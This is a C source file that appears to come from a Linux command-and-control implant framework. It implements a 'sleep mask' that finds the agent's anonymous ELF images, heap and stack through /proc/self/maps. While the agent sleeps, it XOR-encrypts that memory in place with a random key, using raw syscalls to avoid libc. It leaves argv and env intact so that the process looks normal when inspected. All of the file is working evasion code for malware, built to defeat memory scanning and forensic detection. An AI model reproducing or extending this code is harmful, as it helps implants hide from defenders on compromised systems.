/*
 * mask_xor.c — default sleep-mask provider: XOR the agent's memory in place.
 *
 * This code lives in the stager image, which is mapped separately from the
 * agent. The wrapper in mask.c switches to the stager's dedicated mask stack
 * before calling this provider. The provider masks agent-owned memory: every
 * anonymous ELF image plus the process [heap] and [stack]. Runtime mappings
 * (libc/libld data, rseq/shadow-stack named mappings, the stager's own code
 * and GOT) stay untouched so the stub and the running thread keep working.
 *
 * Everything between the first XOR and the second XOR must avoid libc: the
 * agent's heap/stack are encrypted during that window. The timer is a raw
 * nanosleep syscall, and the key is zeroed with a volatile loop.
 */

#define _GNU_SOURCE
#include "mask.h"

#include "mask_ranges.h"

#include "util/maps.h"
#include "util/syscalls.h"
#include "util/utils.h"

#include <stdint.h>

#define MASK_KEY_LEN 32
/* Generous enough for a heavily loaded process; truncation leaves mappings
 * untouched rather than corrupting the map list. */
#define MASK_MAX_MAPS 2048
#define MASK_MAX_RANGES (MASK_MAX_MAPS * 2)
#define MASK_MAP_BUF (512u * 1024u)
#define MASK_MAX_PHNUM 1024
#define MASK_MAX_SEGS 32
#define MASK_ET_DYN 3
#define MASK_ET_EXEC 2
#define MASK_PT_LOAD 1

/* The provider allocates its own scratch area instead of carrying large local
 * arrays: users can replace this file without sizing the stub stack for it.
 * The scratch mapping is path-less and non-ELF, so it is never selected for
 * masking; it is explicitly excluded as well. */
struct mask_scratch {
  char text[MASK_MAP_BUF];
  struct c2_map maps[MASK_MAX_MAPS];
  struct c2_map ranges[MASK_MAX_RANGES];
};

static long mask_syscall(long n, long a1, long a2, long a3) {
  unsigned long ret;
  register long r10 __asm__("r10") = a3;
  __asm__ __volatile__("syscall"
                       : "=a"(ret)
                       : "a"(n), "D"(a1), "S"(a2), "r"(r10)
                       : "rcx", "r11", "memory");
  return (long)ret;
}

static int read_full(int fd, void *buf, size_t len) {
  size_t off = 0;
  while (off < len) {
    long n = read(fd, (uint8_t *)buf + off, len - off);
    if (n < 0) {
      if (n == -4) /* EINTR */
        continue;
      return -1;
    }
    if (n == 0)
      break;
    off += (size_t)n;
  }
  return (int)off;
}

/* Read argv/env bounds from /proc/self/stat (fields 48..51). They are the
 * kernel-visible strings behind /proc/<pid>/cmdline and environ. */
static int read_proc_stat_ranges(uintptr_t *arg_start, uintptr_t *arg_end,
                                 uintptr_t *env_start, uintptr_t *env_end) {
  char buf[512];
  int fd = open("/proc/self/stat", O_RDONLY, 0);
  if (fd < 0)
    return 0;
  int n = read_full(fd, buf, sizeof(buf) - 1);
  close(fd);
  if (n <= 0)
    return 0;
  int end = n;
  while (end > 0 && buf[end - 1] != ')')
    end--;
  if (end == 0)
    return 0;

  uintptr_t v[4] = {0, 0, 0, 0};
  int field = 3;
  char *p = buf + end;
  char *limit = buf + n;
  while (field <= 51 && p < limit) {
    while (p < limit && *p == ' ')
      p++;
    if (p >= limit || *p < '0' || *p > '9') {
      while (p < limit && *p != ' ')
        p++;
      field++;
      continue;
    }
    uintptr_t x = 0;
    while (p < limit && *p >= '0' && *p <= '9') {
      x = x * 10 + (uintptr_t)(*p - '0');
      p++;
    }
    if (field >= 48)
      v[field - 48] = x;
    field++;
  }
  if (v[0] == 0 || v[1] <= v[0] || v[2] == 0 || v[3] <= v[2])
    return 0;
  *arg_start = v[0];
  *arg_end = v[1];
  *env_start = v[2];
  *env_end = v[3];
  return 1;
}

static uint16_t rd16(const uint8_t *p) {
  return (uint16_t)(p[0] | ((uint16_t)p[1] << 8));
}

static uint32_t rd32(const uint8_t *p) {
  return (uint32_t)p[0] | ((uint32_t)p[1] << 8) | ((uint32_t)p[2] << 16) |
         ((uint32_t)p[3] << 24);
}

static uint64_t rd64(const uint8_t *p) {
  return (uint64_t)rd32(p) | ((uint64_t)rd32(p + 4) << 32);
}

struct mask_elf {
  uintptr_t base;
  uintptr_t span;
  uintptr_t bias;
  uint64_t phoff;
  uint16_t phentsize;
  uint16_t phnum;
  int elf64;
  struct {
    uintptr_t start;
    size_t len;
  } segs[MASK_MAX_SEGS];
  size_t nsegs;
};

/* Parse the anonymous ELF at `base` and collect its PT_LOAD segments. */
static int elf_open(uintptr_t base, uintptr_t map_end, struct mask_elf *e) {
  const uint8_t *eh = (const uint8_t *)base;
  if (eh[0] != 0x7f || eh[1] != 'E' || eh[2] != 'L' || eh[3] != 'F')
    return 0;
  if (eh[4] != 1 && eh[4] != 2)
    return 0;
  if (eh[5] != 1) /* little-endian targets only */
    return 0;

  e->base = base;
  e->elf64 = eh[4] == 2;
  uint16_t type = rd16(eh + 16);
  if (type != MASK_ET_DYN && type != MASK_ET_EXEC)
    return 0;
  e->phoff = e->elf64 ? rd64(eh + 32) : rd32(eh + 28);
  e->phentsize = e->elf64 ? rd16(eh + 54) : rd16(eh + 42);
  e->phnum = e->elf64 ? rd16(eh + 56) : rd16(eh + 44);
  size_t min_ph = e->elf64 ? 56u : 32u;
  if (e->phentsize < min_ph || e->phnum == 0 || e->phnum > MASK_MAX_PHNUM)
    return 0;

  uint64_t phbytes = (uint64_t)e->phnum * e->phentsize;
  if (e->phoff > (uint64_t)UINTPTR_MAX || phbytes > (uint64_t)UINTPTR_MAX)
    return 0;
  uintptr_t phstart = base + (uintptr_t)e->phoff;
  if (phstart < base || phstart + (uintptr_t)phbytes < phstart ||
      phstart + (uintptr_t)phbytes > map_end)
    return 0;

  e->bias = type == MASK_ET_DYN ? base : 0;
  uintptr_t max_end = 0;
  e->nsegs = 0;
  for (uint16_t i = 0; i < e->phnum; i++) {
    const uint8_t *ph =
        (const uint8_t *)(phstart + (uintptr_t)i * e->phentsize);
    if (rd32(ph) != MASK_PT_LOAD)
      continue;
    uint64_t vaddr = e->elf64 ? rd64(ph + 16) : rd32(ph + 8);
    uint64_t memsz = e->elf64 ? rd64(ph + 40) : rd32(ph + 20);
    if (memsz == 0)
      continue;
    uintptr_t seg_start = (uintptr_t)(e->bias + vaddr);
    uintptr_t seg_end = seg_start + (uintptr_t)memsz;
    if (seg_end <= seg_start)
      return 0;
    if (seg_end > max_end)
      max_end = seg_end;
    if (e->nsegs < MASK_MAX_SEGS) {
      e->segs[e->nsegs].start = seg_start & ~(uintptr_t)(PAGE_SIZE - 1);
      e->segs[e->nsegs].len =
          ((seg_end + PAGE_SIZE - 1) & ~(uintptr_t)(PAGE_SIZE - 1)) -
          e->segs[e->nsegs].start;
      e->nsegs++;
    }
  }
  if (e->nsegs == 0 || max_end <= base)
    return 0;
  e->span = max_end - base;
  return 1;
}

static int range_present(const struct c2_map *ranges, size_t n, uintptr_t start,
                         uintptr_t end) {
  for (size_t i = 0; i < n; i++)
    if (ranges[i].start == start && ranges[i].end == end)
      return 1;
  return 0;
}

static int map_excluded(const struct c2_map *m, uintptr_t fs_base,
                        uintptr_t gs_base, uintptr_t code_probe,
                        uintptr_t code_end) {
  if (fs_base != 0 && m->start <= fs_base && fs_base < m->end)
    return 1;
  if (gs_base != 0 && m->start <= gs_base && gs_base < m->end)
    return 1;
  if (m->start <= code_probe && code_probe < m->end)
    return 1;
  if (code_end != 0 && m->start == code_end)
    return 1;
  return 0;
}

/* Add every mapping that overlaps one of an image's PT_LOAD segments. */
static size_t add_image_ranges(struct mask_scratch *sc,
                               const struct mask_elf *e, size_t nmaps,
                               uintptr_t keep_start, uintptr_t keep_end,
                               uintptr_t scratch_start, uintptr_t scratch_end,
                               uintptr_t fs_base, uintptr_t gs_base,
                               uintptr_t code_probe, uintptr_t code_end,
                               size_t n) {
  struct c2_map *maps = sc->maps;
  struct c2_map *ranges = sc->ranges;
  for (size_t i = 0; i < nmaps; i++) {
    if (maps[i].start < e->base || maps[i].start >= e->base + e->span)
      continue;
    int belongs = 0;
    for (size_t j = 0; j < e->nsegs; j++) {
      if (maps[i].start < e->segs[j].start + e->segs[j].len &&
          e->segs[j].start < maps[i].end) {
        belongs = 1;
        break;
      }
    }
    if (!belongs ||
        map_excluded(&maps[i], fs_base, gs_base, code_probe, code_end))
      continue;
    if (range_present(ranges, n, maps[i].start, maps[i].end))
      continue;
    n = mask_add_map(maps[i].start, maps[i].end, maps[i].prot, keep_start,
                     keep_end, scratch_start, scratch_end, ranges,
                     MASK_MAX_RANGES, n);
  }
  return n;
}

static size_t find_ranges(struct mask_scratch *sc, uintptr_t keep_start,
                          uintptr_t keep_end, uintptr_t fs_base,
                          uintptr_t gs_base, uintptr_t code_probe) {
  char *text = sc->text;
  struct c2_map *maps = sc->maps;
  struct c2_map *ranges = sc->ranges;
  size_t cap = MASK_MAX_RANGES;
  int fd = open("/proc/self/maps", O_RDONLY, 0);
  if (fd < 0)
    return 0;
  int nread = read_full(fd, text, MASK_MAP_BUF - 1);
  close(fd);
  if (nread <= 0)
    return 0;
  text[nread] = '\0';

  size_t nmaps = c2_maps_parse(text, (size_t)nread, maps, MASK_MAX_MAPS);
  uintptr_t code_end = 0;
  for (size_t i = 0; i < nmaps; i++) {
    if (maps[i].anonymous && (maps[i].prot & PROT_EXEC) &&
        maps[i].start <= code_probe && code_probe < maps[i].end) {
      code_end = maps[i].end;
      break;
    }
  }
  uintptr_t scratch_start = (uintptr_t)sc;
  uintptr_t scratch_end = scratch_start + sizeof(*sc);
  uintptr_t arg_start = 0, arg_end = 0, env_start = 0, env_end = 0;
  int have_argv_env =
      read_proc_stat_ranges(&arg_start, &arg_end, &env_start, &env_end);
  size_t n = 0;

  /* Heap and stack are named agent-owned data mappings. The stack carries
   * argv/env; leave those exact ranges readable so process inspection stays
   * coherent. If the bounds cannot be read, skip the stack rather than corrupt
   * the process command line. */
  for (size_t i = 0; i < nmaps; i++) {
    if (!maps[i].anonymous || !(maps[i].prot & PROT_READ))
      continue;
    if (maps[i].special != C2_MAP_SPECIAL_HEAP &&
        maps[i].special != C2_MAP_SPECIAL_STACK)
      continue;
    if (map_excluded(&maps[i], fs_base, gs_base, code_probe, code_end))
      continue;
    if (maps[i].special == C2_MAP_SPECIAL_STACK) {
      if (!have_argv_env)
        continue;
      /* mprotect works on whole pages: round the argv/env exclusions
       * outward so we never split a page. */
      const uintptr_t pm = (uintptr_t)(PAGE_SIZE - 1);
      const uintptr_t argv_s = arg_start & ~pm;
      const uintptr_t argv_e = (arg_end + pm) & ~pm;
      const uintptr_t env_s = env_start & ~pm;
      const uintptr_t env_e = (env_end + pm) & ~pm;
      const uintptr_t ex[4][2] = {{keep_start, keep_end},
                                  {scratch_start, scratch_end},
                                  {argv_s, argv_e},
                                  {env_s, env_e}};
      n = mask_add_map_ex(maps[i].start, maps[i].end, maps[i].prot, ex, 4,
                          ranges, cap, n);
    } else {
      n = mask_add_map(maps[i].start, maps[i].end, maps[i].prot, keep_start,
                       keep_end, scratch_start, scratch_end, ranges, cap, n);
    }
  }

  /* Every anonymous ELF image: the live agent and any decompressed copy
   * malasada left behind. Adding all PT_LOAD mappings, not just the header
   * mapping, is what makes the r-xp code segment actually masked. */
  for (size_t i = 0; i < nmaps; i++) {
    if (!maps[i].anonymous || !(maps[i].prot & PROT_READ) ||
        maps[i].end - maps[i].start < 4)
      continue;
    const uint8_t *m = (const uint8_t *)maps[i].start;
    if (m[0] != 0x7f || m[1] != 'E' || m[2] != 'L' || m[3] != 'F')
      continue;
    if (map_excluded(&maps[i], fs_base, gs_base, code_probe, code_end))
      continue;
    struct mask_elf image;
    if (!elf_open(maps[i].start, maps[i].end, &image))
      continue;
    n = add_image_ranges(sc, &image, nmaps, keep_start, keep_end, scratch_start,
                         scratch_end, fs_base, gs_base, code_probe, code_end,
                         n);
  }
  return n;
}

static void xor_ranges(const struct c2_map *ranges, size_t n,
                       const uint8_t *key) {
  for (size_t i = 0; i < n; i++) {
    volatile uint8_t *p = (volatile uint8_t *)ranges[i].start;
    size_t len = (size_t)(ranges[i].end - ranges[i].start);
    for (size_t j = 0; j < len; j++)
      p[j] ^= key[j % MASK_KEY_LEN];
  }
}

static void zero_key(volatile uint8_t *key, size_t len) {
  for (size_t i = 0; i < len; i++)
    key[i] = 0;
}

int stager_mask_provider_sleep(unsigned seconds, uintptr_t probe,
                               uintptr_t keep_start, uintptr_t keep_end) {
  (void)probe;
  uintptr_t fs_base = 0;
  uintptr_t gs_base = 0;
  (void)mask_syscall(SYS_arch_prctl, ARCH_GET_FS, (long)&fs_base, 0);
  (void)mask_syscall(SYS_arch_prctl, ARCH_GET_GS, (long)&gs_base, 0);
  uintptr_t code_probe = (uintptr_t)(void *)&stager_mask_provider_sleep;
  struct mask_scratch *sc =
      (struct mask_scratch *)mmap(NULL, sizeof(*sc), PROT_READ | PROT_WRITE,
                                  MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (sc == MAP_FAILED)
    return -1;
  struct c2_map *ranges = sc->ranges;
  size_t n =
      find_ranges(sc, keep_start, keep_end, fs_base, gs_base, code_probe);
  if (n == 0) {
    munmap(sc, sizeof(*sc));
    return -1;
  }

  int ok = 1;
  for (size_t i = 0; i < n; i++)
    if (mprotect((void *)ranges[i].start,
                 (size_t)(ranges[i].end - ranges[i].start),
                 PROT_READ | PROT_WRITE) != 0) {
      ok = 0;
      goto restore;
    }

  uint8_t key[MASK_KEY_LEN];
  if (mask_syscall(SYS_getrandom, (long)key, MASK_KEY_LEN, 0) != MASK_KEY_LEN) {
    for (size_t i = 0; i < sizeof(key); i++)
      key[i] = (uint8_t)(i * 131u + (unsigned)seconds);
  }

  xor_ranges(ranges, n, key);

  struct timespec {
    long tv_sec;
    long tv_nsec;
  } ts;
  ts.tv_sec = (long)seconds;
  ts.tv_nsec = 0;
  long rc;
  do {
    rc = mask_syscall(SYS_nanosleep, (long)&ts, (long)&ts, 0);
  } while (rc == -4);

  xor_ranges(ranges, n, key);
  zero_key(key, sizeof(key));

restore:
  for (size_t i = 0; i < n; i++)
    if (mprotect((void *)ranges[i].start,
                 (size_t)(ranges[i].end - ranges[i].start),
                 ranges[i].prot) != 0)
      ok = 0;
  munmap(sc, sizeof(*sc));
  return ok ? 0 : -1;
}
